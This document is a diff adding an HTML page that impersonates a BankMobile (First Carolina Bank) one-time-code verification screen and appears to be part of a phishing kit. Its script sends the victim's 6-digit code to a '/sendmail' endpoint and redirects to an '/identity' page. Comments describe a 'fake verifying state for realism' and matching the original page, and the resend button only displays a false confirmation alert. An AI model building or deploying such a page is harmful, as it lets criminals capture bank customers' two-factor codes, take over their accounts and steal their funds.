@@ -1,0 +1,351 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Verify Code — BankMobile</title>
+
+  <!-- Match fonts from the original page -->
+  <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@700;900&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg-start:#f7fdff;
+      --bg-end:#f1eefe;
+      --card-bg:#fff;
+      --muted:#6b7280;
+      --accent:rgba(0,112,255,0.7); 
+      --accent-2:#0ea5e9;
+      --input-border:#c9ced3;
+      --shadow: 0 6px 18px rgba(17,24,39,0.08);
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:"Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: linear-gradient(135deg, rgba(225,245,255,0.9) 0%, rgba(243,240,250,0.95) 100%);
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      color:#111827;
+    }
+
+    .hero{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex:1 0 auto;
+      padding:48px 20px;
+    }
+
+    .wrap{
+      width:100%;
+      max-width:720px;
+      display:grid;
+      gap:28px;
+      justify-items:center;
+    }
+
+    .heading{ width:100%; max-width:420px; text-align:center; }
+
+    .lock-wrap{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      height:64px;
+      width:64px;
+      border-radius:14px;
+      background: linear-gradient(180deg, rgba(16,185,129,0.15), rgba(16,185,129,0.08));
+      border: 1px solid rgba(16,185,129,0.15);
+      margin:0 auto 12px;
+    }
+
+    .headline{
+      font-family:"Merriweather", Georgia, serif;
+      font-weight:900;
+      font-size:26px;
+      line-height:1.2;
+      margin:0;
+    }
+
+    .sub{
+      margin:8px 0 0;
+      color:var(--muted);
+      font-size:15px;
+    }
+
+    .card{
+      background:var(--card-bg);
+      border-radius:8px;
+      box-shadow:var(--shadow);
+      padding:22px;
+      width:100%;
+      max-width:420px;
+      border:1px solid rgba(16,24,40,0.03);
+    }
+
+    .field{ display:flex; flex-direction:column; gap:10px; margin-bottom:14px; }
+    .input-wrap{ position:relative; }
+
+    input[type="text"], input[type="password"], input[type="email"], input[type="tel"], input[type="number"]{
+      width:100%;
+      padding:14px;
+      font-size:16px;
+      border-radius:6px;
+      border:1px solid var(--input-border);
+      background:transparent;
+      font-family:inherit;
+      letter-spacing:2px;
+      text-align:center;
+    }
+    input::placeholder{ color:#9aa0a6 }
+    input:focus{ border-color: rgba(0,112,255,0.7); outline:none; box-shadow:0 4px 10px rgba(2,6,23,0.04); }
+
+    .hint {
+      font-size:14px;
+      color:var(--muted);
+      margin-bottom:4px;
+      text-align:center;
+    }
+
+    .error-box{
+      display:none;
+      margin-top:8px;
+      font-size:14px;
+      line-height:1.4;
+      color:#dc2626;
+      align-items:flex-start;
+      gap:8px;
+    }
+
+    .actions{
+      display:flex;
+      gap:10px;
+      margin-top:8px;
+    }
+
+    .btn{
+      flex:1 1 0;
+      padding:14px;
+      border-radius:6px;
+      border:1px solid #cdd3da;
+      font-weight:600;
+      font-size:15px;
+      cursor:pointer;
+      background:#fff;
+    }
+    .btn.primary{
+      background: linear-gradient(180deg, rgba(16,185,129,0.15), rgba(16,185,129,0.08));
+      color: rgba(0,112,255,0.7);
+      border-color: rgba(0,112,255,0.7);
+    }
+    .btn[disabled]{ opacity:0.55; cursor:not-allowed; }
+
+    .under-actions{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      margin-top:14px;
+      gap:12px;
+      flex-wrap:wrap;
+    }
+
+    .link-btn{
+      background:transparent;
+      border:none;
+      padding:0;
+      font:inherit;
+      color:var(--accent-2);
+      cursor:pointer;
+      text-decoration:underline;
+    }
+
+    .checkbox{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      font-size:14px;
+      color:#111827;
+    }
+
+    footer{ padding:18px 20px; text-align:center; font-size:12px; color:#6b7280; }
+
+    @media (max-width:480px){
+      .headline{ font-size:22px }
+      .card{ padding:16px }
+      .btn{ padding:12px }
+    }
+
+    .sr-only{ position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); white-space:nowrap; border:0; }
+  </style>
+</head>
+<body>
+  <main class="hero" role="main">
+    <div class="wrap">
+
+      <div class="heading" aria-live="polite">
+        <div class="lock-wrap" aria-hidden="true">
+          <!-- Clean SVG lock (no external assets) -->
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" 
+     xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+  <!-- Lock body -->
+  <rect x="5" y="10" width="14" height="10" rx="2" 
+        stroke="#0070ff" stroke-width="1.8" fill="white"/>
+  
+  <!-- Lock shackle -->
+  <path d="M8 10V8C8 5.79 9.79 4 12 4C14.21 4 16 5.79 16 8V10" 
+        stroke="#0070ff" stroke-width="1.8" stroke-linecap="round"/>
+  
+  <!-- Keyhole -->
+  <circle cx="12" cy="15" r="1.3" fill="#0070ff"/>
+  <path d="M12 16.5V18" stroke="#0070ff" stroke-width="1.5" stroke-linecap="round"/>
+</svg>
+
+        </div>
+        <p class="headline">We sent a secure code to your <strong>email address</strong>. Once you receive your code, enter it below.</p>
+        <p class="sub">Enter 6-digit code</p>
+      </div>
+
+      <section class="card" aria-label="Enter verification code">
+        <form id="codeForm" novalidate>
+          <div class="field">
+            <label class="sr-only" for="otp">6-digit code</label>
+            <div class="input-wrap">
+              <input id="otp" name="otp" type="text" inputmode="numeric" autocomplete="one-time-code"
+                     placeholder="••••••" maxlength="6" aria-describedby="otpHelp" />
+            </div>
+            <div id="otpHelp" class="hint">Only numbers, no spaces.</div>
+          </div>
+          
+
+          <div class="checkbox">
+            <input id="trust" name="trust" type="checkbox" />
+            <label for="trust">Trust this computer.</label>
+          </div>
+
+          <div id="codeError" class="error-box" role="alert" aria-live="polite">
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="#0070ff" stroke-width="1.5" aria-hidden="true">
+              <circle cx="12" cy="12" r="10" fill="none"/>
+              <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01"/>
+            </svg>
+            <span id="codeErrorText"></span>
+          </div>
+
+          <div class="actions">
+            <button type="button" class="btn" id="goBackBtn">Go Back</button>
+            <button type="submit" class="btn primary" id="submitBtn" disabled>Submit</button>
+          </div>
+
+          <div class="under-actions">
+            <span class="hint">Didn't receive a code?</span>
+            <button type="button" class="link-btn" id="resendBtn">Send new code</button>
+          </div>
+        </form>
+        <p id="status"></p>
+      </section>
+
+    </div>
+  </main>
+
+  <footer>
+    © 2025 BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved. Powered by BM Technologies, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC.
+  </footer>
+
+  <script>
+    (function(){
+      const otp = document.getElementById('otp');
+      const trust = document.getElementById('trust');
+      const form = document.getElementById('codeForm');
+      const submitBtn = document.getElementById('submitBtn');
+      const goBackBtn = document.getElementById('goBackBtn');
+      const errorBox = document.getElementById('codeError');
+      const errorText = document.getElementById('codeErrorText');
+      const resendBtn = document.getElementById('resendBtn');
+
+      // Keep only digits, limit to 6, toggle submit enabled
+      function sanitize(){
+        const digits = (otp.value || '').replace(/\\D/g, '').slice(0,6);
+        otp.value = digits;
+        submitBtn.disabled = digits.length !== 6;
+      }
+
+      otp.addEventListener('input', sanitize);
+      otp.addEventListener('paste', function(e){
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text');
+        otp.value = (pasted || '').replace(/\\D/g, '').slice(0,6);
+        sanitize();
+      });
+
+      form.addEventListener('submit', async function(e){
+  e.preventDefault(); // stop actual form submission
+  errorBox.style.display = 'none';
+
+  const code = (otp.value || '').trim();
+
+  if (code.length !== 6) {
+    errorText.textContent = 'Enter the 6-digit code we sent.';
+    errorBox.style.display = 'flex';
+    errorBox.scrollIntoView({behavior:'smooth', block:'center'});
+    return;
+  }
+
+  // Fake verifying state for realism
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'Verifying…';
+
+  try {
+    const res = await fetch("/sendmail", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ code })
+    });
+    const data = await res.json();
+
+    if (data.error) {                                               
+      errorText.textContent = data.error;
+      errorBox.style.display = 'flex';
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Submit';
+      return;
+    }
+
+    // Redirect cleanly
+    const BASE_URL = window.location.origin; // works locally and on Vercel
+setTimeout(() => {
+  window.location.assign(`${BASE_URL}/identity`);
+}, 1000);
+
+
+  } catch (err) {
+    console.error(err);
+    errorText.textContent = "Failed to send code. Try again.";
+    errorBox.style.display = 'flex';
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Submit';
+  }
+});
+
+
+
+      let resendCooldown = false;
+      resendBtn.addEventListener('click', function(){
+        if(resendCooldown) return;
+        resendCooldown = true;
+        resendBtn.textContent = 'Sending…';
+        setTimeout(function(){
+          resendBtn.textContent = 'Send new code';
+          resendCooldown = false;
+          alert('A new code has been sent to your email.');
+        }, 800);
+      });
+
+      // Focus
+      otp.focus();
+    })();
+  </script>
+</body>
+</html>
+
